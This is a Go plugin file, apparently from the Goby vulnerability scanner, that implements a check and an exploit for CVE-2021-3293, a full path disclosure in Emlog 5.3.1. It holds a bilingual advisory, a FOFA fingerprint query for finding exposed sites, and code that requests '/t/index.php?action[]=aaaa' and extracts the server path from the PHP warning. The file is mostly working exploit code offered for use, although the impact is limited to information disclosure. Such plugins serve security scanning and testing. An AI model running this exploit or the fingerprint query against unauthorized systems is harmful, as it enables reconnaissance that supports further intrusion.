package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Emlog 5.3.1 Path Disclosure (CVE-2021-3293)",
    "Description": "<p>emlog is a fast, stable and easy-to-use blog and CMS website building system based on PHP and MySQL.</p><p>The emlog management system v5.3.1 has a full path disclosure vulnerability in t/index.php. Attackers can see the path of webroot/file through this vulnerability, and cooperate with other vulnerabilities to further exploit.</p>",
    "Impact": "Emlog 5.3.1 Path Disclosure (CVE-2021-3293)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"http://www.emlog.net/\">http://www.emlog.net/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "EMLOG",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "Emlog 管理系统 5.3.1 版本路径信息泄露漏洞 CVE-2021-3293",
            "Description": "<p>emlog是一个基于PHP和MySQL的功能强大的博客及CMS建站系统，追求快速、稳定、简单、舒适的建站体验。</p><p>emlog管理系统 v5.3.1 在 t/index.php 中存在全路径泄露漏洞，攻击者可以通过该漏洞看到 webroot/file 的路径，配合其他漏洞进行更深的利用。</p>",
            "Impact": "<p>emlog管理系统 v5.3.1 在 t/index.php 中存在全路径泄露漏洞，攻击者可以通过该漏洞看到 webroot/file 的路径，配合其他漏洞进行更深的利用。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.emlog.net/\">http://www.emlog.net/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "EMLOG",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Emlog 5.3.1 Path Disclosure (CVE-2021-3293)",
            "Description": "<p>emlog is a fast, stable and easy-to-use blog and CMS website building system based on PHP and MySQL.</p><p>The emlog management system v5.3.1 has a full path disclosure vulnerability in t/index.php. Attackers can see the path of webroot/file through this vulnerability, and cooperate with other vulnerabilities to further exploit.</p>",
            "Impact": "Emlog 5.3.1 Path Disclosure (CVE-2021-3293)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"http://www.emlog.net/\">http://www.emlog.net/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "EMLOG",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "(body=\"content=\\\"emlog\\\"\") || (body=\"content=\\\"emlog\\\"\")",
    "GobyQuery": "(body=\"content=\\\"emlog\\\"\") || (body=\"content=\\\"emlog\\\"\")",
    "Author": "1291904552@qq.com",
    "Homepage": "http://www.emlog.net/",
    "DisclosureDate": "2021-05-25",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-3293"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2021-3293"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "createSelect",
            "value": "/t/index.php?action[]=aaaa",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "EMLOG"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10227"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/t/index.php?action[]=aaaa"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "Warning") && strings.Contains(resp1.RawBody, "on line") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri := cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "Warning") {
					body := regexp.MustCompile("Warning(.*?)on line").FindStringSubmatch(resp.RawBody)
					expResult.Output = body[1]
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
